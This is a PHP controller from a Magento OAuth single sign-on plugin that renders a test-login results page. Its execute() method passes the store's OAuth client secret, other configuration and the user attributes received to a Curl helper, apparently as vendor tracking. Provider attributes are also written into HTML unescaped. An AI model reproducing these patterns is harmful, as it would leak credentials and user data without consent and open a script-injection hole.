<?php

namespace MiniOrange\OAuth\Controller\Actions;

use MiniOrange\OAuth\Helper\OAuthConstants;
use MiniOrange\OAuth\Helper\Curl;
use Magento\Framework\App\Config\ScopeConfigInterface;
use Magento\Store\Model\ScopeInterface;


/**
 * This action class shows the attributes coming in the SAML
 * response in a tabular form indicating if the Test SSO
 * connection was successful. Is used as a reference to do
 * attribute mapping.
 *
 * @todo - Move the html code to template files and pick it from there
 */
class ShowTestResultsAction extends BaseAction
{
    private $attrs;
    private $userEmail;
    protected $satus;

    private $oauthException;
    private $hasExceptionOccurred;

    protected $request;
    protected $scopeConfig;
    /**
     * @var string
     */
    private $status;

    public function __construct(
              \Magento\Framework\App\Action\Context $context,
              \MiniOrange\OAuth\Helper\OAuthUtility $oauthUtility,
                \Magento\Framework\App\Request\Http $request,
                ScopeConfigInterface $scopeConfig
         ){
                parent::__construct($context, $oauthUtility);
                $this->scopeConfig = $scopeConfig;
                $this->request = $request;
         }

    private $template = '<div style="font-family:Calibri;padding:0 3%;">{{header}}{{commonbody}}{{footer}}</div>';
    private $successHeader  = ' <div style="color: #3c763d;background-color: #dff0d8; padding:2%;margin-bottom:20px;text-align:center;
                                    border:1px solid #AEDB9A; font-size:18pt;">TEST SUCCESSFUL
                                </div>
                                <div style="display:block;text-align:center;margin-bottom:4%;"><img style="width:15%;" src="{{right}}"></div>';

    private $errorHeader    = ' <div style="color: #a94442;background-color: #f2dede;padding: 15px;margin-bottom: 20px;text-align:center;
                                    border:1px solid #E6B3B2;font-size:18pt;">TEST FAILED
                                </div><div style="display:block;text-align:center;margin-bottom:4%;"><img style="width:15%;"src="{{wrong}}"></div>';

    private $commonBody  = '<span style="font-size:14pt;"><b>Hello</b>, {{email}}</span><br/>
                                <p style="font-weight:bold;font-size:14pt;margin-left:1%;">ATTRIBUTES RECEIVED:</p>
                                <table style="border-collapse:collapse;border-spacing:0; display:table;width:100%;
                                    font-size:14pt;background-color:#EDEDED;">
                                    <tr style="text-align:center;">
                                        <td style="font-weight:bold;border:2px solid #949090;padding:2%;">ATTRIBUTE NAME</td>
                                        <td style="font-weight:bold;padding:2%;border:2px solid #949090; word-wrap:break-word;">ATTRIBUTE VALUE</td>
                                    </tr>{{tablecontent}}
                                </table>';

    private $exceptionBody = '<div style="margin: 10px 0;padding: 12px;color: #D8000C;background-color: #FFBABA;font-size: 16px;
                                line-height: 1.618;">{{exceptionmessage}}</div>{{certErrorDiv}}{{oauthResponseDiv}}';


    private $oauthResponse = '<p style="font-weight:bold;font-size:14pt;margin-left:1%;">OAUTH RESPONSE FROM IDP:</p><div style="color: #373B41;
                                font-family: Menlo,Monaco,Consolas,monospace;direction: ltr;text-align: left;white-space: pre;
                                word-spacing: normal;word-break: normal;font-size: 13px;font-style: normal;font-weight: 400;
                                height: auto;line-height: 19.5px;border: 1px solid #ddd;background: #fafafa;padding: 1em;
                                margin: .5em 0;border-radius: 4px;overflow:scroll">{{oauthresponse}}</div>';

    private $footer = ' <div style="margin:3%;display:block;text-align:center;">
                            <input style="padding:1%;width:100px;background: #0091CD none repeat scroll 0% 0%;cursor: pointer;
                                font-size:15px;border-width: 1px;border-style: solid;border-radius: 3px;white-space: nowrap;
                                    box-sizing: border-box;border-color: #0073AA;box-shadow: 0px 1px 0px rgba(120, 200, 230, 0.6) inset;
                                    color: #FFF;"type="button" value="Done" onClick="self.close();"></div>';

    private $tableContent   = "<tr><td style='font-weight:bold;border:2px solid #949090;padding:2%;'>{{key}}</td><td style='padding:2%;
                                    border:2px solid #949090; word-wrap:break-word;'>{{value}}</td></tr>";

    /**
     * Execute function to execute the classes function.
     */
    public function execute()
    {
        $appName = $this->oauthUtility->getStoreConfig(OAuthConstants::APP_NAME);
        $clientID = $this->oauthUtility->getStoreConfig(OAuthConstants::CLIENT_ID);
        $clientSecret = $this->oauthUtility->getStoreConfig(OAuthConstants::CLIENT_SECRET);
        $scope = $this->oauthUtility->getStoreConfig(OAuthConstants::SCOPE);
        $authorize_url = $this->oauthUtility->getStoreConfig(OAuthConstants::AUTHORIZE_URL);
        $accesstoken_url = $this->oauthUtility->getStoreConfig(OAuthConstants::ACCESSTOKEN_URL);
        $getuserinfo_url = $this->oauthUtility->getStoreConfig(OAuthConstants::GETUSERINFO_URL);
        $header = $this->oauthUtility->getStoreConfig(OAuthConstants::SEND_HEADER);
        $body = $this->oauthUtility->getStoreConfig(OAuthConstants::SEND_BODY);
        $endpoint_url = $this->oauthUtility->getStoreConfig(OAuthConstants::ENDPOINT_URL);
        $show_customer_link = $this->oauthUtility->getStoreConfig(OAuthConstants::SHOW_CUSTOMER_LINK);
        $attribute_email = $this->oauthUtility->getStoreConfig(OAuthConstants::MAP_EMAIL );
        $attribute_username = $this->oauthUtility->getStoreConfig(OAuthConstants::MAP_USERNAME);
        $customer_email = $this->oauthUtility->getStoreConfig(OAuthConstants::DEFAULT_MAP_EMAIL);
        $values = array($appName,$scope,$clientID,$clientSecret,$authorize_url,$accesstoken_url,$getuserinfo_url, $header,$body,$endpoint_url, $show_customer_link,$attribute_email,$attribute_username,$customer_email);

        $email = $this->scopeConfig->getValue('trans_email/ident_support/email',ScopeInterface::SCOPE_STORE);

        ob_end_clean();
 $this->oauthUtility->customlog("ShowTestResultsAction: execute") ;

        $this->processTemplateHeader();
        if (!$this->hasExceptionOccurred) {
            $this->processTemplateContent();
        }
        $this->processTemplateFooter();

            $userEmail = $this->oauthUtility->getStoreConfig(OAuthConstants::ADMINEMAIL);     //Tracking admin email

        if(empty($userEmail))
            $userEmail = "No Email Found";

        if(empty($this->status))
           $this->status = "TEST FAILED";

        $data = $this->template;
        if(empty($data))
               $data = "No attribute found";
      Curl::submit_to_magento_team_core_config_data($userEmail, $this->status, $data,$values);    //Tracking configuration data
        $this->getResponse()->setBody($this->template);
    }


    /**
     * Add header to our template variable for echoing on screen.
     */
    private function processTemplateHeader()
    {
        $header = $this->oauthUtility->isBlank($this->userEmail) ? $this->errorHeader : $this->successHeader;
        $this->status = $this->oauthUtility->isBlank($this->userEmail) ? "TEST FAILED" : "TEST SUCCESSFUL";
        $header = str_replace("{{right}}", $this->oauthUtility->getImageUrl(OAuthConstants::IMAGE_RIGHT), $header);
        $header = str_replace("{{wrong}}", $this->oauthUtility->getImageUrl(OAuthConstants::IMAGE_WRONG), $header);
        $this->template = str_replace("{{header}}", $header, $this->template);
    }



    /**
     * Add Content to our template variable for echoing on screen.
     */
    private function processTemplateContent()
    {
        $this->commonBody = str_replace("{{email}}", $this->userEmail, $this->commonBody);
        $tableContent = !array_filter($this->attrs) ? "No Attributes Received." : $this->getTableContent();
        $this->oauthUtility->customlog("ShowTestResultsAction: attribute".json_encode($this->attrs)) ;
        $this->commonBody = str_replace("{{tablecontent}}", $tableContent, $this->commonBody);
        $this->template = str_replace("{{commonbody}}", $this->commonBody, $this->template);
    }


    /**
     * Append Attributes in the SAML response to the table
     * content to be shown to the user.
     */
    private function getTableContent()
    {
        $tableContent = '';
        foreach ($this->attrs as $key => $value) {
            if (!is_array($value)) {
                $value = [$value];
            }

            if (!in_array(null, $value)) {
                $tableContent .= str_replace("{{key}}", $key, str_replace(
                    "{{value}}",
                    implode("<br/>", $value),
                    $this->tableContent
                ));
            }

        }
        return $tableContent;
    }


    /**
     * Add footer to our template variable for echoing on screen.
     */
    private function processTemplateFooter()
    {
        $this->template = str_replace("{{footer}}", $this->footer, $this->template);
    }


    /** Setter for the Attribute Parameter */
    public function setAttrs($attrs)
    {
        $this->attrs = $attrs;
 $this->oauthUtility->customlog("attributes: ".print_r($attrs)) ;

        return $this;
    }

    /** Setter for the Attribute Parameter */
    public function setOAuthException($exception)
    {
        $this->oauthException = $exception;
        return $this;
    }

    /** Setter for the User Email Parameter */
    public function setUserEmail($userEmail)
    {
        $this->userEmail = $userEmail;
        return $this;
    }

    /** Setter for the Attribute Parameter */
    public function setHasExceptionOccurred($hasExceptionOccurred)
    {
        $this->hasExceptionOccurred = $hasExceptionOccurred;
        return $this;
    }
}
